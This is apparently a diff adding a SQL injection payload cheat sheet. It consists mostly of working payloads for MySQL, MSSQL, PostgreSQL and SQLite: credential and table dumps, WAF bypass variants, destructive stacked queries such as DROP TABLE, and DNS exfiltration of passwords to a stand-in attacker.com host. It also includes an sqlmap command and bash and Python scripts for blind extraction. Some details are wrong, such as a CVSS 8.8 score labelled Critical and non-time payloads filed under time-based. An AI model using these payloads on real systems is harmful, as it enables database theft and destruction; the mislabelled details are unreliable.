@@ -1,0 +1,182 @@
+# SQL Injection
+
+## Detection Payloads
+
+### Time-Based Blind (Universal)
+' AND SLEEP(5) --
+' AND BENCHMARK(10000000, MD5('a')) --
+' OR '1'='1
+1' UNION SELECT NULL --
+
+### Error-Based
+' AND extractvalue(1, concat(0x7e, (SELECT database()))) --
+' AND updatexml(1, concat(0x7e, (SELECT version())), 1) --
+' OR 1=1 --
+
+### UNION-Based
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT 1,2,3,4,5 --
+' UNION SELECT database(),user(),version(),@@version_comment --
+
+## MySQL Specific
+
+### Time-Based Blind
+id=1' AND SLEEP(5) --
+id=1' AND IF(1=1, SLEEP(5), 0) --
+id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+
+### Data Extraction
+' UNION SELECT CONCAT(user,':',password) FROM mysql.user --
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() --
+' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' --
+
+### Comments
+MySQL: # or -- or /**/
+Payload: 1' OR 1=1 -- -
+
+## MSSQL Specific
+
+### Time-Based Blind
+id=1'; WAITFOR DELAY '00:00:05' --
+id=1' UNION SELECT NULL, NULL, NULL --
+
+### Data Extraction
+' UNION SELECT table_name FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT CONCAT(username, ':', password) FROM users --
+
+## PostgreSQL Specific
+
+### Time-Based Blind
+id=1' AND pg_sleep(5) --
+id=1' OR pg_sleep(5) --
+
+### Data Extraction
+' UNION SELECT table_name FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT string_agg(username || ':' || password, ',') FROM users --
+
+## SQLite Specific
+
+### Time-Based Blind
+id=1' AND (SELECT CASE WHEN (1=1) THEN 0 ELSE 1/(SELECT 0) END) --
+
+### Data Extraction
+' UNION SELECT name FROM sqlite_master WHERE type='table' --
+' UNION SELECT sql FROM sqlite_master WHERE type='table' --
+
+## WAF Bypass Techniques
+
+### Comment Bypass
+Standard: SELECT * FROM users
+Bypass 1: SELECT /*! */ * FROM users
+Bypass 2: SELECT /* comment */ * FROM users
+Bypass 3: SELECT*FROM users (no space)
+Bypass 4: SELECT+FROM users (space as +)
+
+### Encoding Bypass
+Hex: 0x53454c454354 (SELECT in hex)
+Payload: ' UNION SELECT 0x7573657273 -- -
+
+### Function Name Bypass
+Standard: SELECT * FROM users
+Bypass: SELECT * FROM /*!50000users*/
+Bypass: SELECT * FROM `users`
+Bypass: SELECT * FROM [users]
+
+### Operator Variation
+' OR 1=1 --
+' OR 'a'='a
+' OR 1 --
+' OR true --
+' OR '1'='1' --
+
+### Space Removal
+' OR'1'='1
+'OR'1'='1
+' /*!50000OR*/ '1'='1
+
+### Case Variation
+' uNiOn SeLeCt ...
+' UNION SELECT ...
+' Union Select ...
+
+## Advanced Payloads
+
+### Stacked Queries (if enabled)
+id=1; DROP TABLE users; --
+id=1; UPDATE users SET admin=1 WHERE id=1; --
+
+### Boolean-Based Blind
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' --
+
+### Out-of-Band Exfiltration (DNS)
+' UNION SELECT load_file(concat('\\\\',(SELECT database()),'.attacker.com\\')) --
+' UNION SELECT dns_encode((SELECT password FROM users LIMIT 1), 'attacker.com') --
+
+## Proof of Concept
+
+### Using sqlmap
+sqlmap -u "https://target.com/product?id=1" \
+  --dbs \
+  --batch \
+  --random-agent \
+  --level=5 \
+  --risk=3 \
+  --technique=BEUSTQ
+
+### Manual Time-Based Blind
+```bash
+#!/bin/bash
+target="https://target.com/user?id="
+payload="1' AND IF(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1)='a',SLEEP(5),0) -- -"
+
+# If response takes >5s, character is 'a'
+curl -s -w "Response time: %{time_total}s\n" "$target$(urlencode "$payload")"
+```
+
+### Python PoC
+```python
+import requests
+import time
+
+target = "https://target.com/product?id="
+db_name = ""
+
+for i in range(1, 10):
+    for char in "abcdefghijklmnopqrstuvwxyz0123456789_":
+        payload = f"1' AND IF(SUBSTRING((SELECT database()),{i},1)='{char}',SLEEP(2),0) -- -"
+
+        start = time.time()
+        r = requests.get(target + payload, timeout=10, verify=False)
+        elapsed = time.time() - start
+
+        if elapsed >= 2:
+            db_name += char
+            print(f"[Found] Database: {db_name}")
+            break
+```
+
+## CVSS Examples
+
+### SQL Injection (Unauthenticated, Database Read)
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+Score: 7.5 (High)
+- Direct database access
+- No auth required
+- No user interaction
+
+### SQL Injection (Authenticated, with Data Exfiltration)
+CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+Score: 8.8 (Critical)
+- Full database compromise
+- User authenticated but still critical
+- Can dump all data, modify, delete
+
+### Blind Time-Based SQL Injection
+CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
+Score: 5.9 (Medium)
+- Slower exploitation (timing dependent)
+- But full data leak possible
+- AC:H due to network/timing sensitivity
